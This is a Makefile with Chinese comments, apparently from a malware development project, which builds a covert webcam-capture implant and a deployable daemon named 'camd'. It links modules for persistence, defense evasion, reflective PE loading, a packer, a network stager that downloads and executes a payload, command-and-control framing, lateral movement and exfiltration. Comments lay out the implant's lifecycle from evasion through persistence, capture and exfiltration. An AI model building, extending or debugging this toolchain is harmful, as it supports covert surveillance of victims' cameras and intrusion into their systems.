# agent_windows/Makefile
#
# 构建策略（平台分层，避免 Windows 源码污染 Linux 构建）：
#
#   all / test  —— Linux 可编译测试目标。只编译跨平台纯 C 源码：
#                    src/cam_jpeg.c   （YUYV422→JPEG 编码器，纯 C99）
#                    src/cam_mock.c   （Mock 采集后端，纯 C）
#                    include/camera.h （公共接口）
#                  Windows 专属后端 src/cam_mf.cpp / src/cam_mf_main.cpp
#                  被 #ifdef _WIN32 整体包裹，Linux 下不参与编译、不参与链接。
#
#   win         —— Windows 后端编译目标（可选）。需要 MinGW 交叉工具链或
#                  MSVC；Linux 沙盒无 windows.h / mfapi.h，检测到无工具链
#                  时打印跳过信息并返回 0（不是错误）。

CC       ?= cc
CXX      ?= g++

# defend_win.c 复用 17_loader 的 PE 导出解析与 19_defense 的桩字节，
# 不重复实现这两层，因此构建时需要带上它们的头文件与对应源文件。
DEP_I    := -I../17_loader/include -I../19_defense/include
# cam_daemon.c 需要驻留（09）、回传（21_exfil）、信元（14_p2p）、
# C2 帧（02_c2）、横向（08_lateral）五处头文件。不重复实现任何一层，
# 只引用它们的接口。
DAEMON_I := -I../09_persistence/include -I../21_exfil/include \
            -I../14_p2p/include -I../02_c2/include -I../08_lateral/include
# tls:// 出口需要自研 TLS 客户端的头文件。刻意不加进 DEP_I：DEP_I 作用于
# 每一个测试二进制，而只有 camd 与 test_cam_daemon 链了 cam_daemon.o。
TLS_I    := -I../25_tls/include -I../00_crypto/include
CFLAGS   ?= -std=c99 -O2 -Wall -Wextra -Wpedantic -Iinclude $(DEP_I) $(DAEMON_I) \
            $(TLS_I)
CXXFLAGS ?= -std=c++17 -O2 -Wall -Wextra -Iinclude
LDLIBS   ?= -lm

BUILD     := build/linux

# 上游构建触发。
#
# 下面的 winshim 链接规则用 ../20_packer/build/*.o —— 那是 shell glob，在
# recipe 执行时展开。上游 clean 后 glob 不匹配任何文件，shell 把模式原样
# 传给编译器，报的是 "No such file or directory" 或一串无关的 undefined
# reference，真实原因（上游未构建）被掩盖。与 25_deploy 是同一类缺陷。
#
# $(shell) 在读取阶段真实执行上游 make：上游自身有增量判断，已构建时几乎
# 零开销。stdout 必须丢弃（否则混进变量值），stderr 保留。
_PACKER_PREBUILD := $(shell $(MAKE) -C ../20_packer --no-print-directory >/dev/null)

# cam_factory.c 提供统一的 cam_source_create / cam_source_destroy 并按 backend
# 名字分发；cam_mock.c 与 cam_linux_v4l2.c 现在可以同时链接（此前两者都导出
# cam_source_create，只能二选一，导致 Linux 真机无法在保留 mock 测试的前提下
# 启用 V4L2）。
PORT_SRCS := src/cam_jpeg.c src/cam_mock.c src/cam_factory.c \
            src/cam_linux_v4l2.c src/implant.c src/defend_win.c \
            src/reflect_run.c
PORT_OBJS := $(PORT_SRCS:src/%.c=$(BUILD)/%.o)

# cam_daemon.o **不**进 PORT_OBJS。
#
# 它依赖驻留（09）/ 回传（21_exfil）/ 信元（14_p2p）三个上游模块。
# PORT_OBJS 会被通用规则链进**每一个**测试二进制，把 cam_daemon.o 放进去
# 会让其余测试全部 undefined reference —— 一次就把整模块构建打碎。
# 故单独成变量，只链进需要它的目标。
DAEMON_OBJ := $(BUILD)/cam_daemon.o

# cam_daemon 的跨模块依赖：驻留（09）+ 回传（21_exfil）+ 信元（14_p2p）。
#
# 不用 $(shell $(MAKE) -C ...) 在读取阶段触发：那会让本 Makefile 的
# **每一次**调用（包括 make -n、make clean、构建无关目标）都付出上游
# 全量构建的代价，实测让单次构建从秒级变成数十秒。
# 改为显式 phony 目标，只作为 test_cam_daemon 的 order-only 前置。
.PHONY: upstream-deps
upstream-deps:
	@missing=0; \
	for f in $(DAEMON_DEPS); do [ -f "$$f" ] || missing=1; done; \
	if [ $$missing -eq 0 ]; then exit 0; fi; \
	$(MAKE) -C ../09_persistence --no-print-directory >/dev/null; \
	$(MAKE) -C ../08_lateral    --no-print-directory >/dev/null; \
	$(MAKE) -C ../14_p2p        --no-print-directory >/dev/null; \
	$(MAKE) -C ../21_exfil      --no-print-directory >/dev/null

PERSIST_OBJ := ../09_persistence/build/persist.o
EXFIL_OBJS  := ../21_exfil/build/exfil.o ../21_exfil/build/exfil_link.o
P2PLIB      := ../14_p2p/build/libp2p.a
C2OBJS      := ../14_p2p/build/c2.o ../14_p2p/build/c2_frame.o \
               ../14_p2p/build/crypto_gcm.o ../14_p2p/build/crypto_hash.o \
               ../14_p2p/build/crypto_x25519.o
LATLIB      := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o

# tls:// 出口：自研 TLS 1.2 客户端（25_tls）。
#
# 只进 camd 与 test_cam_daemon —— 那两个是唯一链 cam_daemon.o 的目标。
# 放进 PORT_OBJS 会让**每一个**测试二进制都背上 RSA/X25519/GCM：构建变慢，
# 且把大数运算的攻击面塞进根本不联网的测试里。
#
# 不含 tls_server.c：camd 是客户端，服务端代码不该出现在植入体里。
# 不含 00_crypto：gcm/hash/x25519 已由上面的 C2OBJS 提供，重复链会撞符号。
TLS_SRCS := ../25_tls/src/bn.c ../25_tls/src/asn1.c ../25_tls/src/rsa.c \
            ../25_tls/src/x509.c ../25_tls/src/tls.c
TLS_OBJS := $(TLS_SRCS:../25_tls/src/%.c=$(BUILD)/tls/%.o)

# 上游产物不参与本 Makefile 的增量判断（它们由上游自己的 make 管），
# 但必须声明为 order-only 依赖，否则首次构建时链接器可能拿到空/旧文件。
DAEMON_DEPS := $(PERSIST_OBJ) $(EXFIL_OBJS) $(P2PLIB) $(C2OBJS) $(LATLIB)

DEP_OBJS  := $(BUILD)/dep/loader_pe.o $(BUILD)/dep/loader_reflect.o \
             $(BUILD)/dep/defense_evade.o

# test_v4l2_caps：V4L2 设备能力判定单测。
# 它 #include 了 cam_linux_v4l2.c 以触达 static 判定函数，不链 PORT_OBJS
# 之外的东西。必须进 all —— 这条判定是"这颗设备能不能采"的唯一把关点，
# 判错不报错、只静默降级成合成帧，是采集链最坏的失效形态。
TESTS     := test_pipeline test_linux_extra test_implant test_defend_win \
             test_reflect_run test_cam_daemon test_v4l2_caps
TEST_BINS := $(TESTS:%=$(BUILD)/%)

# camd：部署用入口二进制（src/cam_daemon_main.c）。
# 与 test_cam_daemon 的区别：前者参数写死在测试里、跑满 2 批即停、密钥硬编码；
# 后者所有维度走命令行，退出码有明确语义，供部署脚本与服务单元调用。
CAMDBIN := $(BUILD)/camd
CAMBIN_OBJ := $(BUILD)/cam_daemon_main.o

# winshim 下的测试（test_mf_logic / test_persist_win / test_implant_main /
# test_stager_win）不在 all 里，它们需要 Windows shim 编译链；回归脚本
# 显式调用 winshim-build 来构建。声明给审计脚本，避免被判为"默认目标漏构建"。
AUDIT_GOALS := winshim-build

# 默认目标必须显式钉为 all。
#
# GNU make 的默认目标是「文件中第一个不以 '.' 开头、且非模式规则的目标」。
# upstream-deps 这个 phony 目标定义在 all 之前（它只作为 test_cam_daemon 的
# order-only 前置），于是裸 `make` 的默认目标一直是 upstream-deps：只确保上游
# 模块已构建，**一个测试二进制都不产出，而退出码仍是 0**。
#
# 危害与 26_lateral_auto / 08_lateral / 14_p2p 那一类同源：回归脚本先 `make`
# 再扫 build/ 下的 test_*，裸 make 什么都不建时，扫到的都是上一次显式构建
# 留下的旧二进制——源码改了、报告照样全绿。实测：清空 build/linux 后跑裸 make，
# 产出 0 个 test_*，rc=0。
#
# 用 .DEFAULT_GOAL 而不是把 all 挪到前面：后者依赖「规则定义的先后顺序」这一
# 隐式约定，将来任何人再往上插一个 phony 目标就会重新踩坑。
.DEFAULT_GOAL := all

.PHONY: all test clean win dirs

all: $(TEST_BINS) $(CAMDBIN)

dirs:
	@mkdir -p $(BUILD)

$(BUILD)/%.o: src/%.c include/camera.h | dirs
	$(CC) $(CFLAGS) -c $< -o $@

# 25_tls 客户端源码。放 build/tls/ 子目录而非 build/ 根：
# 上面的通用规则是 src/%.c -> build/%.o，25_tls 的 bn.c/rsa.c 等若落进
# build/ 根会与同名目标混淆（且把上游源码的产物混进本模块产物目录）。
$(BUILD)/tls/%.o: ../25_tls/src/%.c | dirs
	@mkdir -p $(BUILD)/tls
	$(CC) $(CFLAGS) -c $< -o $@

# 复用的外部模块目标文件（17_loader 的 PE 解析 / 19_defense 的桩字节）
$(BUILD)/dep/loader_pe.o: ../17_loader/src/pe.c | dirs
	@mkdir -p $(BUILD)/dep
	$(CC) $(CFLAGS) -c $< -o $@

# 反射加载：17_loader 只做到内存映像构造，权限/TLS/入口三步在 src/reflect_run.c
$(BUILD)/dep/loader_reflect.o: ../17_loader/src/reflect.c | dirs
	@mkdir -p $(BUILD)/dep
	$(CC) $(CFLAGS) -c $< -o $@

$(BUILD)/dep/defense_evade.o: ../19_defense/src/evade.c | dirs
	@mkdir -p $(BUILD)/dep
	$(CC) $(CFLAGS) -c $< -o $@

# 每个测试二进制 = 该测试源码 + 跨平台内核源码 + 复用的外部模块
# synth_pe.c 是测试共用的合成 PE 构造器（test_reflect_run 与 test_stager_win 共用），
# 见 tests/synth_pe.h 顶部关于"为何不复制一份"的说明。
$(BUILD)/synth_pe.o: tests/synth_pe.c tests/synth_pe.h | dirs
	$(CC) $(CFLAGS) -c $< -o $@

$(BUILD)/test_%: tests/test_%.c $(PORT_OBJS) $(DEP_OBJS) $(BUILD)/synth_pe.o | dirs
	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DEP_OBJS) $(BUILD)/synth_pe.o -o $@ $(LDLIBS)

# test_v4l2_caps 显式规则：覆盖上面的通用模式规则。
#
# 该测试 #include 了 src/cam_linux_v4l2.c 以触达 static 判定函数（不这么做得
# 为了可测而把生产代码的可见性改大，那是为测试污染设计）。因此它**不能再链**
# cam_linux_v4l2.o —— 实测双重定义：
#   multiple definition of `cam_source_create_v4l2' / `cam_source_destroy_v4l2'
# 链接直接失败。故从 PORT_OBJS 里滤掉那一个 .o。
#
# -Wno-unused-function 只对本测试目标生效：整份 .c 被包含进来，而本测试只测
# 其中三个函数，其余 static 函数在本 TU 内确实未被引用。不给 -Werror 之外，
# 这条抑制不会掩盖别处的问题——其他目标仍是完整告警集。
CAPS_OBJS := $(filter-out $(BUILD)/cam_linux_v4l2.o,$(PORT_OBJS))

# src/cam_linux_v4l2.c 必须在依赖里。
# 该测试用 #include 把它整体包含进来，若只依赖 tests/*.c，改了被包含的源码
# make 不会重建——测试永远跑旧代码，改坏了也照样全绿。实测：注入"无条件读
# device_caps"的旧缺陷后重跑，11 条断言**全部仍通过**，变异存活。这正是
# 本仓库反复出现的"静默陈旧"缺陷，只是换了载体（include 而非链接）。
$(BUILD)/test_v4l2_caps: tests/test_v4l2_caps.c src/cam_linux_v4l2.c \
                         include/camera.h $(CAPS_OBJS) $(DEP_OBJS) \
                         $(BUILD)/synth_pe.o | dirs
	$(CC) $(CFLAGS) -Wno-unused-function $< $(CAPS_OBJS) $(DEP_OBJS) \
	      $(BUILD)/synth_pe.o -o $@ $(LDLIBS)

# cam_daemon 测试：显式规则，覆盖上面的通用模式规则。
# 额外链入驻留 / 回传 / 信元三个上游模块，把「采集—驻留—回传」真正串起来。
$(BUILD)/test_cam_daemon: tests/test_cam_daemon.c $(PORT_OBJS) $(DAEMON_OBJ) \
                          $(DEP_OBJS) $(TLS_OBJS) $(BUILD)/synth_pe.o \
                          $(DAEMON_DEPS) | dirs upstream-deps
	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) \
	      $(BUILD)/synth_pe.o \
	      $(PERSIST_OBJ) $(EXFIL_OBJS) $(LATLIB) $(C2OBJS) $(P2PLIB) \
	      $(TLS_OBJS) -o $@ $(LDLIBS)

# camd 部署入口：与 test_cam_daemon 同一套依赖，但不链 synth_pe.o（那是 PE
# 合成构造器，只有反射加载类测试用得上），入口换成 cam_daemon_main.o。
$(CAMBIN_OBJ): src/cam_daemon_main.c include/cam_daemon.h include/camera.h | dirs
	$(CC) $(CFLAGS) -c $< -o $@

$(CAMDBIN): $(CAMBIN_OBJ) $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) $(TLS_OBJS) \
            $(DAEMON_DEPS) | dirs upstream-deps
	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) \
	      $(PERSIST_OBJ) $(EXFIL_OBJS) $(LATLIB) $(C2OBJS) $(P2PLIB) \
	      $(TLS_OBJS) -o $@ $(LDLIBS)

test: $(TEST_BINS)
	@fail=0; \
	for t in $(TEST_BINS); do \
		echo "=== $$t ==="; \
		./$$t || fail=1; \
	done; \
	exit $$fail

# Windows 后端：仅在检测到 MinGW 交叉工具链时真正编译
win: | dirs
	@if command -v x86_64-w64-mingw32-g++ >/dev/null 2>&1; then \
		x86_64-w64-mingw32-g++ $(CXXFLAGS) -c src/cam_mf.cpp -o $(BUILD)/cam_mf.o \
			&& echo "win: cam_mf.cpp 编译 OK"; \
	else \
		echo "win: 跳过（无 Windows 工具链 / windows.h；cam_mf.cpp 不参与 Linux 构建）"; \
	fi

clean:
	rm -rf build

# ---------------------------------------------------------------------------
# winshim —— 用 Windows SDK shim 在 Linux 下对 cam_mf.cpp 做真实编译 + 逻辑验证
#
# 背景：MinGW 交叉工具链在本沙盒不可得（apt 源 403，GitHub release 403），
# 因此无法做真机交叉编译。等价路径是由 tests/winsdk_shim 提供 Windows
# 头文件的最小等价声明 + 可运行 mock Media Foundation，使 Windows 专用源码
# 能被 g++ 真实编译，并用受控假设备真跑其逻辑分支。
#
# 覆盖：语法、类型、调用契约、格式协商、取帧、生命周期。
# 不覆盖：Windows Media Foundation 的真实设备行为（需真机）。
#
# 该验证已抓出 5 个真实缺陷，详见 tests/winsdk_shim/README。
# ---------------------------------------------------------------------------
SHIM_BUILD := build/winshim
SHIM_I     := -Iinclude -Itests/winsdk_shim -I../17_loader/include -D_WIN32
SHIM_CXX   := $(CXX) -std=c++14 -O1 -Wall -Wextra -Wno-unknown-pragmas $(SHIM_I) \
              -I../25_deploy/include -I../20_packer/include -D_GNU_SOURCE
SHIM_CC    := $(CC) -std=c11 -O1 -Wall -Wextra $(SHIM_I) \
              -I../25_deploy/include -I../20_packer/include -I../00_crypto/include -D_GNU_SOURCE

.PHONY: winshim winshim-build

# 采集能力目标文件组。
#
# 凡链接了"通过统一 cam_source_create 取后端"的源码（implant.c 是，
# test_mf_logic.cpp 也是），都必须带上 cam_factory.o —— 工厂是唯一提供该
# 符号的目标文件。此前只在 test_implant_main 一处链了它，test_mf_logic
# 漏掉，实跑 winshim-build 时 undefined reference（真实构建破损）。
#
# 打包成变量而不是各处手写：漏一处就是链接期才暴露的破损，而且报错是
# "undefined reference to cam_source_create"，看不出缺的是哪个 .o。
SHIM_CAM_OBJS := $(SHIM_BUILD)/cam_mf.o $(SHIM_BUILD)/cam_jpeg.o \
                 $(SHIM_BUILD)/cam_factory.o

winshim-build:
	@mkdir -p $(SHIM_BUILD)
	# 工厂先编译：它提供统一的 cam_source_create / cam_source_destroy，
	# 本目标下所有需要采集能力的链接都要链它，必须先于那些链接产出。
	$(SHIM_CXX) -x c++ -c src/cam_factory.c -o $(SHIM_BUILD)/cam_factory.o
	$(SHIM_CXX) -c src/cam_mf.cpp -o $(SHIM_BUILD)/cam_mf.o
	$(SHIM_CXX) -c tests/winsdk_shim/shim_impl.cpp -o $(SHIM_BUILD)/shim_impl.o
	$(SHIM_CXX) -c tests/test_mf_logic.cpp -o $(SHIM_BUILD)/test_mf_logic.o
	$(CXX) $(SHIM_BUILD)/cam_factory.o $(SHIM_BUILD)/cam_mf.o \
	      $(SHIM_BUILD)/shim_impl.o \
	      $(SHIM_BUILD)/test_mf_logic.o -o $(SHIM_BUILD)/test_mf_logic
	# G2：持久化。persist_win.c 是 Windows 专属源码，用 -x c++ 编译，
	#     链接 shim_impl.o 提供的有状态注册表 mock，安装行为可真读回验证。
	$(SHIM_CXX) -x c++ -c src/persist_win.c -o $(SHIM_BUILD)/persist_win.o
	$(SHIM_CXX) -c tests/test_persist_win.cpp -o $(SHIM_BUILD)/test_persist_win.o
	$(CXX) $(SHIM_BUILD)/persist_win.o $(SHIM_BUILD)/shim_impl.o \
	      $(SHIM_BUILD)/test_persist_win.o -o $(SHIM_BUILD)/test_persist_win
	# 单体植入体接线层：对抗 -> 驻留 -> 采集 -> 打包 -> 回传 的完整生命周期。
	# implant_main.c / implant.c / cam_mock.c 是纯 C99，用 -x c++ 与 shim 一起编译，
	# 使 Windows 专属的 persist_win.o（shim 注册表）能被真实链接进来。
	$(SHIM_CXX) -x c++ -c src/implant_main.c -o $(SHIM_BUILD)/implant_main.o
	$(SHIM_CXX) -x c++ -c src/reflect_run.c -o $(SHIM_BUILD)/reflect_run.o
	$(SHIM_CXX) -x c++ -c ../17_loader/src/pe.c -o $(SHIM_BUILD)/pe.o
	$(SHIM_CXX) -x c++ -c ../17_loader/src/reflect.c -o $(SHIM_BUILD)/reflect.o
	$(SHIM_CXX) -x c++ -c src/implant.c -o $(SHIM_BUILD)/implant.o
	$(SHIM_CXX) -x c++ -c src/cam_jpeg.c -o $(SHIM_BUILD)/cam_jpeg.o
	# cam_factory.o 已在本目标开头编译（见上），此处不再重复。
	$(SHIM_CXX) -c tests/test_implant_main.cpp -o $(SHIM_BUILD)/test_implant_main.o
	# 采集后端用 cam_mf.o（Windows 真实代码路径 + shim 假设备），而不是
	# cam_mock.o：这样验证的是 Windows 采集路径本身能被主循环驱动。
	# （分发层 cam_factory.o 已单独链入，见上。）
	$(CXX) $(SHIM_BUILD)/implant_main.o $(SHIM_BUILD)/implant.o \
	      $(SHIM_BUILD)/reflect_run.o $(SHIM_BUILD)/pe.o $(SHIM_BUILD)/reflect.o \
	      $(SHIM_CAM_OBJS) \
	      $(SHIM_BUILD)/persist_win.o $(SHIM_BUILD)/shim_impl.o \
	      $(SHIM_BUILD)/test_implant_main.o -o $(SHIM_BUILD)/test_implant_main

	# Windows 投送链端到端：Winsock 拉块 -> 组装 -> 解包 -> 反射装载 -> 真执行
	#
	# 服务端也走 shim 的 Winsock（转发宿主真实 TCP），因此 stager 必须真的
	# 连上、真的解析 HTTP 报文才能拿到块 —— 不是 mock 恒返回成功。
	#
	# C 与 C++ 分开编译：投递层是 C11 源码，用 -x c++ 会撞上 C++ 的类型严格性
	# （void* 不再隐式转换）。shim 头文件（winsock2.h / winmem.h）刻意做成
	# C/C++ 双可用，头文件侧则统一用 extern "C" 保证跨语言链接。
	$(SHIM_CC) -c src/drop_stager_win.c -o $(SHIM_BUILD)/drop_stager_win.o
	$(SHIM_CC) -c ../25_deploy/src/drop.c -o $(SHIM_BUILD)/s_drop.o
	$(SHIM_CC) -c ../25_deploy/src/drop_http.c -o $(SHIM_BUILD)/s_drop_http.o
	$(SHIM_CC) -c ../25_deploy/src/drop_pe.c -o $(SHIM_BUILD)/s_drop_pe.o
	$(SHIM_CC) -c tests/synth_pe.c -o $(SHIM_BUILD)/s_synth_pe.o
	$(SHIM_CC) -c tests/stager_srv.c -o $(SHIM_BUILD)/s_stager_srv.o
	$(SHIM_CXX) -c tests/winsdk_shim/shim_winsock.cpp -o $(SHIM_BUILD)/shim_winsock.o
	$(SHIM_CXX) -c tests/test_stager_win.cpp -o $(SHIM_BUILD)/test_stager_win.o
	$(CXX) $(SHIM_BUILD)/test_stager_win.o $(SHIM_BUILD)/drop_stager_win.o \
	      $(SHIM_BUILD)/s_drop.o $(SHIM_BUILD)/s_drop_http.o \
	      $(SHIM_BUILD)/s_drop_pe.o $(SHIM_BUILD)/s_synth_pe.o \
	      $(SHIM_BUILD)/s_stager_srv.o $(SHIM_BUILD)/reflect_run.o \
	      $(SHIM_BUILD)/pe.o $(SHIM_BUILD)/reflect.o \
	      $(SHIM_BUILD)/shim_winsock.o $(SHIM_BUILD)/shim_impl.o \
	      ../20_packer/build/*.o -o $(SHIM_BUILD)/test_stager_win -lpthread

winshim: winshim-build
	@./$(SHIM_BUILD)/test_mf_logic
	@./$(SHIM_BUILD)/test_persist_win
	@./$(SHIM_BUILD)/test_implant_main
	@./$(SHIM_BUILD)/test_stager_win
